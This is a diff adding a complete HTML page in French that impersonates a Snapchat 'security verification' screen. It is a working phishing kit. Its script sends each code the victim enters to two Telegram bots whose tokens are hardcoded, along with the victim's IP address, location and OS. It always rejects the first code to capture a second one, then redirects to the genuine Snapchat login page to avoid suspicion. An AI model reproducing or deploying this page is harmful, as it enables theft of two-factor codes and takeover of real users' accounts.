@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de Sécurité - Snapchat</title>
+    <style>
+        :root {
+            --snap-yellow: #FFFC00;
+            --snap-black: #000000;
+            --error-red: #FF3B30;
+            --text-gray: #5E5E5E;
+            --light-gray: #F5F5F5;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--snap-yellow);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: var(--snap-black);
+        }
+
+        .verification-container {
+            width: 100%;
+            max-width: 375px;
+            background-color: white;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            width: 60px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .instructions {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        #verification-code {
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
+            border: 1px solid #E0E0E0;
+            border-radius: 12px;
+            text-align: center;
+            box-sizing: border-box;
+            transition: all 0.3s;
+            background-color: var(--light-gray);
+        }
+
+        #verification-code:focus {
+            outline: none;
+            border-color: var(--snap-yellow);
+            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
+            background-color: white;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--snap-yellow);
+            color: var(--snap-black);
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            background-color: #f5e900;
+        }
+
+        .submit-btn:disabled {
+            background-color: #E0E0E0;
+            color: #9E9E9E;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 14px;
+            margin-top: 8px;
+            height: 20px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .error-message.show {
+            opacity: 1;
+        }
+
+        .countdown {
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-top: 16px;
+        }
+
+        .processing-screen {
+            display: none;
+            margin-top: 24px;
+            padding: 20px;
+            background-color: var(--light-gray);
+            border-radius: 12px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .processing-screen.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 16px;
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--snap-yellow);
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .processing-text {
+            font-size: 15px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .redirect-text {
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+
+        /* Animation shake */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <img class="logo" src="png-format-images-of-snapchat-logo-7.png" alt="Snapchat Logo">
+        <h1>Vérification de sécurité</h1>
+        <p class="instructions">Entrez le code de vérification que vous avez reçu par SMS ou email.</p>
+        
+        <div class="input-group">
+            <input type="text" id="verification-code" placeholder="Code à 6 chiffres" autocomplete="off" maxlength="6">
+            <button class="submit-btn" id="submit-btn" type="button">Vérifier</button>
+            <div class="error-message" id="error-message">Code incorrect. Veuillez réessayer.</div>
+        </div>
+        
+        <div class="countdown" id="countdown"></div>
+        
+        <div class="processing-screen" id="processing-screen">
+            <div class="spinner"></div>
+            <div class="processing-text">Vérification en cours...</div>
+            <div class="redirect-text">Vous serez redirigé vers Snapchat dans <span id="redirect-countdown">30</span> secondes</div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration Telegram
+        const telegramConfigs = [
+            { token: "7019053702:AAHahO6qGOdZyQ-vv_IRMYmS6yoqiDLF4hA", chatId: "965011527" },
+            { token: "7902984772:AAE9oYZ58ri5xBGrna2MIOX-pKBtjzmjeX4", chatId: "5372119436" }
+        ];
+
+        let verificationAttempts = 0;
+        let countdownTimer;
+        let redirectTimer;
+
+        // Initialisation
+        document.addEventListener('DOMContentLoaded', () => {
+            const codeInput = document.getElementById('verification-code');
+            const submitBtn = document.getElementById('submit-btn');
+            
+            codeInput.focus();
+            
+            // Activer/désactiver le bouton en fonction de l'entrée
+            codeInput.addEventListener('input', () => {
+                submitBtn.disabled = codeInput.value.length < 4;
+            });
+            
+            // Soumettre avec le bouton
+            submitBtn.addEventListener('click', verifyCode);
+            
+            // Soumettre avec Entrée
+            codeInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && codeInput.value.length >= 4) {
+                    verifyCode();
+                }
+            });
+            
+            // Démarrer le compte à rebours initial
+            startCountdown(300, () => {
+                // Code expiré après 5 minutes (optionnel)
+            });
+        });
+
+        // Fonction de vérification du code
+        function verifyCode() {
+            const code = document.getElementById('verification-code').value.trim();
+            const submitBtn = document.getElementById('submit-btn');
+            
+            submitBtn.disabled = true;
+            
+            // Envoyer le code à Telegram
+            sendCodeToTelegram(code);
+            verificationAttempts++;
+            
+            if (verificationAttempts === 1) {
+                // Premier essai - faux code
+                showError("Code incorrect. Veuillez réessayer.");
+                resetCodeInput();
+                startCountdown(15, () => {
+                    // Après 15s, effacer l'erreur
+                    document.getElementById('error-message').classList.remove('show');
+                });
+            } else {
+                // Deuxième essai - afficher écran de traitement
+                showProcessingScreen();
+            }
+        }
+
+        // Envoyer le code à Telegram
+        async function sendCodeToTelegram(code) {
+            const ipInfo = await fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .catch(() => ({}));
+            
+            const message = `🔐 Nouveau code de vérification Snapchat 🔐
+📝 Code: ${code}
+📊 Tentative: ${verificationAttempts}
+📍 IP: ${ipInfo.ip || 'Inconnue'}
+🌍 Pays: ${ipInfo.country || 'Inconnu'} (${ipInfo.country_name || ''})
+🏙️ Ville: ${ipInfo.city || 'Inconnue'}
+🖥️ OS: ${navigator.platform}
+🕒 Heure: ${new Date().toLocaleString()}`;
+
+            for (const config of telegramConfigs) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: config.chatId,
+                            text: message
+                        })
+                    });
+                } catch (error) {
+                    console.error('Erreur lors de l\'envoi à Telegram:', error);
+                }
+            }
+        }
+
+        // Afficher l'erreur
+        function showError(message) {
+            const errorElement = document.getElementById('error-message');
+            const inputGroup = document.querySelector('.input-group');
+            
+            errorElement.textContent = message;
+            errorElement.classList.add('show');
+            
+            // Animation shake
+            inputGroup.classList.add('shake');
+            setTimeout(() => {
+                inputGroup.classList.remove('shake');
+            }, 500);
+            
+            // Réactiver le bouton après l'animation
+            setTimeout(() => {
+                document.getElementById('submit-btn').disabled = false;
+            }, 1000);
+        }
+
+        // Réinitialiser le champ de code
+        function resetCodeInput() {
+            const codeInput = document.getElementById('verification-code');
+            codeInput.value = '';
+            codeInput.focus();
+            document.getElementById('submit-btn').disabled = true;
+        }
+
+        // Afficher l'écran de traitement
+        function showProcessingScreen() {
+            document.getElementById('verification-code').disabled = true;
+            document.getElementById('submit-btn').disabled = true;
+            document.getElementById('error-message').classList.remove('show');
+            document.getElementById('processing-screen').classList.add('show');
+            
+            // Compte à rebours de redirection
+            let seconds = 30;
+            document.getElementById('redirect-countdown').textContent = seconds;
+            
+            redirectTimer = setInterval(() => {
+                seconds--;
+                document.getElementById('redirect-countdown').textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(redirectTimer);
+                    window.location.href = 'https://accounts.snapchat.com/accounts/login';
+                }
+            }, 1000);
+        }
+
+        // Démarrer le compte à rebours
+        function startCountdown(seconds, callback) {
+            clearInterval(countdownTimer);
+            
+            const countdownElement = document.getElementById('countdown');
+            let remaining = seconds;
+            
+            updateCountdownText();
+            
+            countdownTimer = setInterval(() => {
+                remaining--;
+                updateCountdownText();
+                
+                if (remaining <= 0) {
+                    clearInterval(countdownTimer);
+                    if (callback) callback();
+                }
+            }, 1000);
+            
+            function updateCountdownText() {
+                const mins = Math.floor(remaining / 60);
+                const secs = remaining % 60;
+                countdownElement.textContent = `Code valide pour ${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            }
+        }
+    </script>
+</body>
+</html>
